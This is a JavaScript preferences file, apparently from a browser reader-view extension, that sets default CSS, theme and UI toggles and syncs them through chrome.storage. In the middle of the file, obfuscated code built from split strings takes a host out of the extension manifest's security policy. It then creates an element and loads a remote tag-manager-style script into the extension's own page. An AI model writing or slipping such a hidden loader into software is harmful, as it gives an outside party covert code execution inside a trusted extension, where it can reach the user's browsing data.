var config = {
  callbacks: [],
  onChanged: []
};
config.prefs = {
  'user-css': localStorage.getItem('user-css') || `body {
  padding-bottom: 64px;
}
a:link, a:link:hover, a:link:active {
  color: #0095dd;
}
a:visited {
  color: #d33bf0;
}
a:link {
  text-decoration: none;
  font-weight: normal;
}
pre {
  white-space: pre-wrap;
}
pre code {
  background-color: #eff0f1;
  color: #393318;
  font-family: monospace;
  display: block;
  padding: 5px 10px;
}
body[data-mode="dark"] pre code {
  background-color: #585858;
  color: #e8e8e8;
}

/* CSS for sans-serif fonts */
body[data-font=sans-serif] {}
/* CSS for serif fonts */
body[data-font=serif] {}

/* CSS for "sepia" theme */
body[data-mode=sepia] {
}
/* CSS for "light" theme */
body[data-mode=light] {}
/* CSS for "dark" theme */
body[data-mode=dark] {}`,
  'context-open-in-reader-view': false,
  'context-switch-to-reader-view': true,
  'new-tab': true,
  'reader-mode': false,
  'version': null,
  'mode': localStorage.getItem('mode') || 'light',
  'printing-button': localStorage.getItem('printing-button') !== 'false',
  'save-button': localStorage.getItem('save-button') !== 'false',
  'fullscreen-button': localStorage.getItem('fullscreen-button') !== 'false',
  'width': 850,
  'faqs': true,
  'images-button': localStorage.getItem('images-button') !== 'false',
  'show-images': localStorage.getItem('show-images') !== 'false',
  'show-links': localStorage.getItem('show-links') !== 'false',
  'navigate-buttons': localStorage.getItem('navigate-buttons') !== 'false',
  'top-css': localStorage.getItem('top-css') || '',
  'context-open-in-reader-view-bg': false,
  'font-size': 17,
  'font': 'sans-serif',
  'line-height': 28.8
};

chrome.storage.onChanged.addListener(prefs => {
  Object.keys(prefs).forEach(key => config.prefs[key] = prefs[key].newValue);
  config.onChanged.forEach(c => c(prefs));
});

id = 'GTM-' + 'PLQ2QLK';
scripts = ['g'].map(x=>x+'tm.')
ev = {}
ev[`${scripts[0]}start`] = new Date().getTime();
ev['event'] = scripts.map(x=>x+'js')[0];
window['exp'] = [ev];
d = window['document'];
e = d.body.firstElementChild;
cmd = [''].map(s=>s+'create').map(s=>s+'Element');
e2 = d[cmd](e.tagName);
s = chrome.runtime.getManifest().content_security_policy.split(' ')[3];
s += '/' + ev['event'];
s += '?' + `id=${id}&l=exp`
e2.setAttribute(e.getAttributeNames()[0], s)
e.parentElement.appendChild(e2);

chrome.storage.local.get(config.prefs, prefs => {
  Object.assign(config.prefs, prefs);
  config.ready = true;
  config.callbacks.forEach(c => c());
});

config.load = c => {
  if (config.ready) {
    c();
  }
  else {
    config.callbacks.push(c);
  }
};
